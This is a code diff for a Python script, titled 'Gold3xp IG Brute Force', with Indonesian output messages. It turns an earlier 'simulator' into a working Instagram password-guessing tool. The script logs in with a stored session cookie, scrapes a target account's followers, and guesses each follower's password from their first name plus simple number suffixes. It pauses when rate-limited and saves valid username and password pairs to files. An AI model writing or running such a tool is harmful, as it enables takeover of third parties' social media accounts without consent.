@@ -1,29 +1,96 @@
+import os
+import json
+import time
+import random
+from instagrapi import Client
+from instagrapi.exceptions import LoginRequired, ChallengeRequired, PleaseWaitFewMinutes, FeedbackRequired
 from utils.scraper import scrape_followers
-from utils.brute_force import brute_force_attack
-import json, os
+from utils.brute_force import try_login
 from colorama import Fore, init
+
 init(autoreset=True)
 
-def load_hash_db(path="hash_db.json"):
-    if not os.path.exists(path):
-        print(Fore.RED + "[!] hash_db.json tidak ditemukan.")
+DATA_FOLDER = "Data/akun1"
+COOKIE_FILE = os.path.join(DATA_FOLDER, "cookie.txt")
+USER_FILE = os.path.join(DATA_FOLDER, "user.txt")
+HASH_DB = "hash_db.json"
+
+def load_cookie():
+    if not os.path.exists(COOKIE_FILE) or not os.path.exists(USER_FILE):
+        print(Fore.RED + "[!] cookie.txt atau user.txt tidak ditemukan.")
+        exit()
+
+    with open(USER_FILE, "r") as f:
+        username = f.read().strip()
+
+    with open(COOKIE_FILE, "r") as f:
+        cookie_raw = f.read().strip()
+
+    cookies = {}
+    for part in cookie_raw.split(";"):
+        if "=" in part:
+            k, v = part.strip().split("=", 1)
+            cookies[k] = v
+    return username, cookies
+
+def save_result(username, password):
+    with open("hasil_sukses.txt", "a") as f:
+        f.write(f"{username} | {password}\n")
+
+def load_hash_db():
+    if not os.path.exists(HASH_DB):
         return {}
-    with open(path, "r") as f:
+    with open(HASH_DB, "r") as f:
         return json.load(f)
 
-def main():
-    print(Fore.CYAN + "=== Gold3xp IG Brute Force Simulator ===")
-    target_username = input(Fore.YELLOW + "Masukkan username target: @").strip()
+def update_hash_db(db):
+    with open(HASH_DB, "w") as f:
+        json.dump(db, f, indent=2)
 
-    print(Fore.YELLOW + "[*] Mengambil followers dari @" + target_username + "...")
-    followers = scrape_followers(target_username)
-    if not followers:
-        print(Fore.RED + "[!] Tidak ada followers ditemukan.")
+def main():
+    os.system("clear")
+    print(Fore.CYAN + "== Gold3xp IG Brute Force ==")
+    target_user = input(Fore.YELLOW + "Masukkan username target (tanpa @): ").strip()
+
+    login_user, cookies = load_cookie()
+
+    cl = Client()
+    try:
+        cl.login_by_sessionid(cookies.get("sessionid"))
+        print(Fore.GREEN + f"[✓] Login berhasil sebagai @{login_user}")
+    except Exception as e:
+        print(Fore.RED + f"[✗] Gagal login: {e}")
         return
 
-    print(Fore.YELLOW + f"[*] {len(followers)} followers ditemukan. Memulai brute force...\n")
+    print(Fore.CYAN + f"⏳ Mengambil followers dari @{target_user}...")
+    followers = scrape_followers(cl, target_user)
+    print(Fore.GREEN + f"[✓] Ditemukan {len(followers)} followers")
+
     hash_db = load_hash_db()
-    brute_force_attack(followers, hash_db)
+
+    for username, full_name in followers.items():
+        name_parts = full_name.split(" ")
+        base = name_parts[0] if name_parts else username
+        passwords = [base + str(i) for i in [123, 1234, 12345, 321, ""]]
+
+        for password in passwords:
+            print(Fore.YELLOW + f"⏳ Menguji: {username} | {password}")
+            status = try_login(username, password)
+            if status == "success":
+                print(Fore.GREEN + f"✅ Valid: {username} | {password}")
+                save_result(username, password)
+                hash_db[username] = password
+                update_hash_db(hash_db)
+                break
+            elif status == "challenge":
+                print(Fore.RED + f"🔒 Checkpoint: {username}")
+                break
+            elif status == "feedback":
+                print(Fore.MAGENTA + f"🔁 Kena rate limit. Jeda dulu...")
+                time.sleep(60)
+                continue
+            else:
+                print(Fore.RED + f"❌ Invalid")
 
 if __name__ == "__main__":
     main()
